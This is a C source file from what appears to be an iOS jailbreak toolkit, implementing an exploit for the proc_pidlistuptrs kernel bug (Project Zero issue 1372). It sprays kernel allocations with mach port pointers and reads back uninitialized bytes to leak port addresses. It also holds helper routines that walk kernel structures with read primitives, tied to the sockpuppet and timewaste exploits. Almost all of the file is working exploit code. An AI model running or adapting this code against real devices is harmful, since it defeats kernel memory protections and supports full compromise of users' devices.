#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <mach/mach.h>

#include "ImportantHolders.h"
#include "kernel_memory.h"
#include "find_port.h"
#include "common.h"
#include "OffsetHolder.h"
#include "KernelUtils.h"
#include "KernelRwWrapper.h"
#include "ImportantHolders.h"

/*
 * this is an exploit for the proc_pidlistuptrs bug (P0 issue 1372)
 *
 * It will reliably determine the kernel address of a mach port.
 * Knowing the addresses of ports makes the other UaF exploit much simpler.
 */

// missing headers
#define KEVENT_FLAG_WORKLOOP 0x400

typedef uint64_t kqueue_id_t;

struct kevent_qos_s {
    uint64_t ident; /* identifier for this event */
    int16_t filter; /* filter for event */
    uint16_t flags; /* general flags */
    uint32_t qos; /* quality of service when servicing event */
    uint64_t udata; /* opaque user data identifier */
    uint32_t fflags; /* filter-specific flags */
    uint32_t xflags; /* extra filter-specific flags */
    int64_t data; /* filter-specific data */
    uint64_t ext[4]; /* filter-specific extensions */
};

#define PRIVATE
#include <sys/event.h>
#include <sys/time.h>
#include <sys/types.h>

struct kevent_extinfo {
    struct kevent_qos_s kqext_kev;
    uint64_t kqext_sdata;
    int kqext_status;
    int kqext_sfflags;
    uint64_t kqext_reserved[2];
};

extern int kevent_id(uint64_t id, const struct kevent_qos_s* changelist, int nchanges, struct kevent_qos_s* eventlist, int nevents, void* data_out, size_t* data_available, unsigned int flags);

int proc_list_uptrs(pid_t pid, uint64_t* buffer, uint32_t buffersize);

// appends n_events user events onto this process's kevent queue
static void fill_events(int n_events)
{
    struct kevent_qos_s events_id[] = { { .filter = EVFILT_USER,
        .ident = 1,
        .flags = EV_ADD,
        .udata = 0x2345 } };
    
    kqueue_id_t id = 0x1234;
    
    for (int i = 0; i < n_events; i++) {
        int err = kevent_id(id, events_id, 1, NULL, 0, NULL, NULL,
                            KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);
        
        if (err != 0) {
            LOG("failed to enqueue user event");
            exit(EXIT_FAILURE);
        }
        
        events_id[0].ident++;
    }
}

int kqueues_allocated = 0;

static void prepare_kqueue(void)
{
    // ensure there are a large number of events so that kevent_proc_copy_uptrs
    // always returns a large number
    if (kqueues_allocated) {
        return;
    }
    fill_events(10000);
    LOG("prepared kqueue");
    kqueues_allocated = 1;
}

// will make a kalloc allocation of (count*8)+7
// and only write to the first (count*8) bytes.
// the return value is those last 7 bytes uninitialized bytes as a uint64_t
// (the upper byte will be set to 0)
static uint64_t try_leak(int count)
{
    int buf_size = (count * 8) + 7;
    char* buf = calloc(buf_size + 1, 1);
    
    int err = proc_list_uptrs(getpid(), (void*)buf, buf_size);
    
    if (err == -1) {
        return 0;
    }
    
    // the last 7 bytes will contain the leaked data:
    uint64_t last_val = ((uint64_t*)buf)[count]; // we added an extra zero byte in the calloc
    
    return last_val;
}

struct ool_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

// fills a kalloc allocation with count times of target_port's struct ipc_port pointer
// To cause the kalloc allocation to be free'd mach_port_destroy the returned receive right
static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)
{
    // allocate a port to send the message to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        LOG("failed to allocate port");
        exit(EXIT_FAILURE);
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(struct ool_msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        LOG("failed to send message: %s", mach_error_string(err));
        exit(EXIT_FAILURE);
    }
    
    return q;
}

static int uint64_t_compare(const void* a, const void* b)
{
    uint64_t a_val = (*(uint64_t*)a);
    uint64_t b_val = (*(uint64_t*)b);
    if (a_val < b_val) {
        return -1;
    }
    if (a_val == b_val) {
        return 0;
    }
    return 1;
}

uint64_t find_port_via_proc_pidlistuptrs_bug(mach_port_t port, int disposition)
{
    prepare_kqueue();
    
    int n_guesses = 100;
    uint64_t* guesses = calloc(1, n_guesses * sizeof(uint64_t));
    int valid_guesses = 0;
    
    for (int i = 1; i < n_guesses + 1; i++) {
        mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);
        mach_port_destroy(mach_task_self(), q);
        uint64_t leaked = try_leak(i - 1);
        //LOG("leaked %016llx", leaked);
        
        // a valid guess is one which looks a bit like a kernel heap pointer
        // without the upper byte:
        if ((leaked < 0x00ffffff00000000) && (leaked > 0x00ffff0000000000)) {
            guesses[valid_guesses++] = leaked | 0xff00000000000000;
        }
    }
    
    if (valid_guesses == 0) {
        LOG("couldn't leak any kernel pointers");
        exit(EXIT_FAILURE);
    }
    
    // return the most frequent guess
    qsort(guesses, valid_guesses, sizeof(uint64_t), uint64_t_compare);
    
    uint64_t best_guess = guesses[0];
    int best_guess_count = 1;
    
    uint64_t current_guess = guesses[0];
    int current_guess_count = 1;
    for (int i = 1; i < valid_guesses; i++) {
        if (guesses[i] == guesses[i - 1]) {
            current_guess_count++;
            if (current_guess_count > best_guess_count) {
                best_guess = current_guess;
                best_guess_count = current_guess_count;
            }
        } else {
            current_guess = guesses[i];
            current_guess_count = 1;
        }
    }
    
    //LOG("best guess is: 0x%016llx with %d%% of the valid guesses for it", best_guess, (best_guess_count*100)/valid_guesses);
    
    free(guesses);
    
    return best_guess;
}

uint64_t find_port_via_kmem_read(mach_port_name_t port) {
    if (kCFCoreFoundationVersionNumber >= 1751.108) {//1556.00 = 12.4) {//1751.108=14.0
        uint64_t task_port_addr = task_self_addr();
        uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
        uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
        uint32_t port_index = port >> 8;
        const int sizeof_ipc_entry_t = 0x18;
        uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
        return port_addr;

    } else {
        uint64_t task_port_addr = task_self_addr();
        uint64_t task_addr = kernel_read64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        uint64_t itk_space = kernel_read64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
        uint64_t is_table = kernel_read64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
        uint32_t port_index = port >> 8;
        const int sizeof_ipc_entry_t = 0x18;
        uint64_t port_addr = kernel_read64(is_table + (port_index * sizeof_ipc_entry_t));
        return port_addr;
    }
}

uint64_t find_port_via_kmem_read_not(mach_port_name_t port)
{
    uint64_t task_port_addr = task_self_addr_cache;
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t find_port_via_kmem_read_not_TW(mach_port_name_t port)
{
    uint64_t task_port_addr = our_port_addr_exportedBYTW;
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

uint64_t find_port_address_sockpuppet(mach_port_t port, int disposition)
{
    if (have_kmem_read()) {
        return find_port_via_kmem_read_not(port);
    }
    return find_port_via_proc_pidlistuptrs_bug(port, disposition);
}

uint64_t find_port_address_timewaste(mach_port_t port, int disposition)
{
    if (have_kmem_read()) {
        return find_port_via_kmem_read_not_TW(port);
    }
    return find_port_via_proc_pidlistuptrs_bug(port, disposition);
}

uint64_t find_port_address(mach_port_t port, int disposition)
{
    if (have_kmem_read()) {
        return find_port_via_kmem_read(port);
    }
    return find_port_via_proc_pidlistuptrs_bug(port, disposition);
}
